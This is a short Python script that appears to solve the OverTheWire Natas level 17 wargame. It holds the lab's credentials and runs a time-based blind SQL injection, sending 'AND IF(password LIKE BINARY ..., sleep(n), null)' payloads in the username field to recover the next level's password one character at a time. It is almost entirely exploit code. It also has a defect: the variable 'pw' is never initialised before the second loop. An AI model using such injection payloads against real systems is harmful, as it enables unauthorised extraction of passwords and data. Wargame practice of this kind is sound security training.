#!/usr/bin/env python3
import httplib2
import urllib
from timeit import default_timer as timer

h = httplib2.Http()
h.add_credentials('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 
usedChars = "";
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
for i in chars:
    t = timer()
    query = urllib.parse.urlencode(dict(username="natas18\" AND IF (password LIKE BINARY \"%" + i + "%\", sleep(3), null) ;# "))
    resp, content = h.request("http://natas17.natas.labs.overthewire.org/index.php?" + query, method="POST")
    elapsed=timer() - t
    #print(str(round(elapsed,6)))
    #print('\n\n'+str(content))
    if (round(elapsed,6)>1.9):
        usedChars += i;
        print("Used Chars: " + usedChars)

print("Used Chars include: "+usedChars)


while len(pw) < 33:
    for i in usedChars:
        t = timer()
        query = urllib.parse.urlencode(dict(username="natas18\" AND IF (password LIKE BINARY \"" + pw + i + "%\", sleep(5), null) ;# "))
        resp, content = h.request("http://natas17.natas.labs.overthewire.org/index.php?" + query, method="POST")
        elapsed=timer() - t
        #print(str(round(elapsed,6)))
        #print('\n\n'+str(content))
        if (round(elapsed,6)>4.9):
            pw += i;
            print("pw: " + pw + ((32-len(pw))*"*"))
